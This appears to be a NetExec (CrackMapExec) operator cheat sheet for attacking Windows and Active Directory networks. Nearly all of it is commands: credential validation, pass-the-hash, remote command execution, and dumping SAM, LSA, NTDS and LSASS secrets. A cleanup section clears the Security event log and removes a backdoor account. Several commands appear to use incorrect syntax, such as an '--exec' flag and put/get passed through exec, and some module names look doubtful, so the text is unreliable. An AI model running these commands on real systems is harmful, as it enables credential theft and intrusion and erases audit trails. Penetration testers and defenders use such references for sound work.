# NetExec

!!! tip "NetExec replaces CrackMapExec"
    NetExec (`nxc`) is the actively maintained fork of CrackMapExec (`cme`). Commands are near-identical — just replace `cme` with `nxc`. Use `nxc` on new installs; `cme` still works but is no longer maintained.

---
## Core Syntax

```bash
nxc <protocol> <target(s)> [flags]
```

### Protocols

- `smb` – Server Message Block (Windows file shares)
- `winrm` – Remote Windows PowerShell
- `ldap` – AD user/group enumeration
- `kerberos` – For TGT/TGS ticket hunting (w/ `--kerberos`)
- `mssql`, `rdp`, `ssh`, `ftp`, `http`, `imap` – Available via modules

---
## Authentication Methods

| Method | Syntax Example |
|---|---|
| Plaintext | `-u user -p pass` |
| Hashes (PTH) | `-u user -H aad3...:hash` |
| Kerberos | `-k -d domain.local` (Requires `KRB5CCNAME` or ticket) |

---
## SMB Examples

### Validate Credentials

```bash
nxc smb 10.10.10.10 -u alice -p Winter2020!
```

### Enumerate Shares

```bash
nxc smb 10.10.10.10 -u alice -p Winter2020! --shares
```

**Expected Output:**

```text
[+] 10.10.10.10:445 - Found 3 accessible shares:
    - ADMIN$
    - C$
    - Public
```

### Download File

```bash
nxc smb 10.10.10.10 -u <user> -p <pass> --get-file "\\Users\\Public\\loot.txt" loot.txt --share C$
```

### Upload File

```bash
nxc smb 10.10.10.10 -u <user> -p <pass> --put-file local.exe "\\Temp\\local.exe" --share C$
```

### Dump SAM / LSA / NTDS

Always try these with local admin or DA — often yields immediate credentials or the whole domain:

```bash
nxc smb 10.10.10.10 -u Administrator -p <pass> --sam     # local SAM hashes
nxc smb 10.10.10.10 -u Administrator -p <pass> --lsa     # LSA secrets (cached creds, service accounts)
nxc smb 10.10.10.10 -u Administrator -p <pass> --ntds    # full NTDS.dit dump (run against DC)
```

---
## Remote Code Execution

### Over SMB

```bash
nxc smb 10.10.10.10 -u admin -p 'Passw0rd!' -d DOMAIN --exec 'cmd.exe /c whoami'
```

> Requires admin access.

### Over WinRM (PowerShell)

```bash
nxc winrm 10.10.10.10 -u admin -p 'Passw0rd!' -d domain --exec 'whoami'
```

---
## Pass-the-Hash (PTH)

```bash
nxc smb 10.10.10.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:ccb749a1e26e51b6e07ed92d6d68f762 -d domain --exec 'hostname'
```

---
## Kerberos Authentication (TGT-based)

```bash
impacket-getTGT domain/user:password
export KRB5CCNAME=/path/to/krb5cc_domain
nxc smb 10.10.10.10 -k -d domain.local --exec 'whoami'
```

> Use for OPSEC-safe access when you already have a valid ticket.

---
## AD Enumeration via LDAP

```bash
nxc ldap 10.10.10.10 -u user -p pass -d domain.local --users
nxc ldap 10.10.10.10 -u user -p pass -d domain.local --groups
```

Other LDAP options: `--computers`, `--password-policy`, `--domain-controllers`, `--loggedon-users`

---
## Modules You Should Know

```bash
nxc smb 10.10.10.10 -u user -p pass -d domain --modules
```

- `lsassy`: Extracts LSASS credentials via SeDebugPrivilege
- `wmi`: Executes WMI queries
- `psremote`: Executes PowerShell scripts remotely
- `samdump`: Dumps local SAM hashes
- `dpapi`: Attempts DPAPI blob extraction
- `credz`: Parses saved credentials

---
## Cleanup (Post-Exploitation Hygiene)

Remove artifacts:

```bash
nxc smb 10.0.0.12 -u user -p pass --exec "del C:\Temp\rev.exe"
```

Clear Windows Event Logs (noisy — only if absolutely necessary):

```bash
nxc winrm 10.0.0.12 -u user -p pass -d domain --exec 'wevtutil cl Security'
```

Delete a backdoor account:

```bash
nxc smb 10.0.0.12 -u admin -p pass --exec 'net user backdoor /delete'
```

---
## NetExec Cheatsheet

| Task | Command Example |
| --- | --- |
| Check credentials (SMB) | `nxc smb 10.10.10.10 -u user -p pass` |
| Enumerate shares | `nxc smb 10.10.10.10 -u user -p pass --shares` |
| List domain users/groups | `nxc ldap 10.10.10.10 -u user -p pass --users / --groups` |
| PTH authentication | `nxc smb 10.10.10.10 -u user -H LM:NT` |
| Kerberos authentication | `nxc smb -k -d domain.local` |
| Execute command (SMB) | `nxc smb 10.10.10.10 -u admin -p pass --exec 'whoami'` |
| WinRM command execution | `nxc winrm 10.10.10.10 -u admin -p pass --exec 'hostname'` |
| Upload file | `nxc smb 10.10.10.10 --exec 'put local.exe \\C$\Temp\back.exe'` |
| Download file | `nxc smb 10.10.10.10 --exec 'get \\C$\Temp\loot.txt local.txt'` |
| Pivot with ProxyChains | `proxychains nxc smb 10.10.10.10 ...` |
| Enumerate AD password policy | `nxc ldap 10.10.10.10 -u user -p pass --password-policy` |

---
## Recommended Operator Workflow

```text
[0] Known creds? Try them!
 ↓
[1] Validate credentials (SMB or WinRM)
 ↓
[2] Enumerate shares → find loot
 ↓
[3] Enumerate users, groups, computers via LDAP
 ↓
[4] Identify Admin rights → execute payload or commands
 ↓
[5] Pivot internally via ProxyChains or socks
 ↓
[6] Dump creds (lsassy, samdump, dpapi)
 ↓
[7] Cleanup (remove binaries/logs)
```

> After first access, start a BloodHound collection or dump tokens for delegation/impersonation.
